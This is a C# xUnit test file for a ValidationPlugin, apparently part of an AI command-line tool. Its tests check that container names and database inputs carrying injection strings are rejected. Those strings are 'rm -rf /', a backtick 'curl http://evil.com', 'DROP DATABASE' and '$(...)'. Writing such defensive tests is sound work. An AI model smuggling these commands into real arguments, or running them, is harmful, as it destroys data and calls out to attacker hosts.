using System;
using System.Net.Http;
using System.Threading.Tasks;
using FluentAssertions;
using Honua.Cli.AI.Services.Execution;
using Xunit;

namespace Honua.Cli.AI.Tests.Services.Execution;

/// <summary>
/// Tests for ValidationPlugin ensuring secure command execution
/// </summary>
[Trait("Category", "Integration")]
public class ValidationPluginTests
{
    private class MockPluginExecutionContext : IPluginExecutionContext
    {
        public string WorkspacePath => "/tmp/test";
        public bool RequireApproval => false;
        public bool DryRun => false;
        public string SessionId => "test-session";
        public List<PluginExecutionAuditEntry> AuditTrail => new();

        public void RecordAction(string plugin, string action, string details, bool success, string? error = null) { }
        public Task<bool> RequestApprovalAsync(string action, string details, string[] resources) => Task.FromResult(true);
    }

    private class MockHttpClientFactory : IHttpClientFactory
    {
        public HttpClient CreateClient(string name) => new HttpClient();
    }

    [Fact]
    public async Task CheckDockerContainer_WithMaliciousContainerName_ShouldThrow()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act & Assert
        await Assert.ThrowsAsync<ArgumentException>(async () =>
        {
            await plugin.CheckDockerContainer("container; rm -rf /");
        });
    }

    [Fact]
    public async Task CheckDockerContainer_WithCommandInjectionAttempt_ShouldThrow()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act & Assert
        await Assert.ThrowsAsync<ArgumentException>(async () =>
        {
            await plugin.CheckDockerContainer("container`curl http://evil.com`");
        });
    }

    [Fact]
    public async Task CheckDockerContainer_WithValidName_ShouldNotThrow()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act - This will fail to find the container, but should not throw security exception
        var result = await plugin.CheckDockerContainer("valid-container-name");

        // Assert - Result should be valid JSON (even if container not found)
        result.Should().Contain("success");
    }

    [Fact]
    public async Task CheckDatabaseConnection_WithCommandInjection_ShouldThrow()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act & Assert
        await Assert.ThrowsAsync<ArgumentException>(async () =>
        {
            await plugin.CheckDatabaseConnection("postgres; DROP DATABASE test;");
        });
    }

    [Fact]
    public async Task CheckDatabaseConnection_WithShellMetacharacters_ShouldThrow()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act & Assert
        await Assert.ThrowsAsync<ArgumentException>(async () =>
        {
            await plugin.CheckDatabaseConnection("$(malicious command)");
        });
    }

    [Fact]
    public async Task CheckDatabaseConnection_WithValidContainerName_ShouldNotThrow()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act - This will fail to connect, but should not throw security exception
        var result = await plugin.CheckDatabaseConnection("postgres-db");

        // Assert - Result should be valid JSON (even if connection fails)
        result.Should().Contain("success");
    }

    [Fact]
    public async Task CheckDatabaseConnection_WithValidConnectionString_ShouldNotThrow()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act - This will fail to connect, but should not throw security exception
        var result = await plugin.CheckDatabaseConnection("postgres://user@localhost:5432/db");

        // Assert - Result should be valid JSON (even if connection fails)
        result.Should().Contain("success");
    }

    [Fact]
    public async Task CheckHttpEndpoint_WithValidUrl_ShouldNotThrow()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act - This might fail due to network, but should not throw ArgumentException
        var result = await plugin.CheckHttpEndpoint("http://localhost:8080");

        // Assert - Result should be valid JSON
        result.Should().Contain("success");
    }

    [Fact]
    public async Task CheckFileExists_WithRelativePath_ShouldWork()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());

        // Act
        var result = await plugin.CheckFileExists("test.txt");

        // Assert - Result should be valid JSON
        result.Should().Contain("success");
        result.Should().Contain("exists");
    }

    [Fact]
    public async Task ValidateJsonStructure_WithValidJson_ShouldWork()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());
        var jsonContent = "{\"name\": \"test\", \"value\": 123}";

        // Act
        var result = await plugin.ValidateJsonStructure(jsonContent, "name,value");

        // Assert
        result.Should().Contain("success");
        result.Should().Contain("isValid");
    }

    [Fact]
    public async Task ValidateJsonStructure_WithMissingFields_ShouldReportMissing()
    {
        // Arrange
        var context = new MockPluginExecutionContext();
        var plugin = new ValidationPlugin(context, new MockHttpClientFactory());
        var jsonContent = "{\"name\": \"test\"}";

        // Act
        var result = await plugin.ValidateJsonStructure(jsonContent, "name,value,missing");

        // Assert
        result.Should().Contain("success");
        result.Should().Contain("missingFields");
    }
}
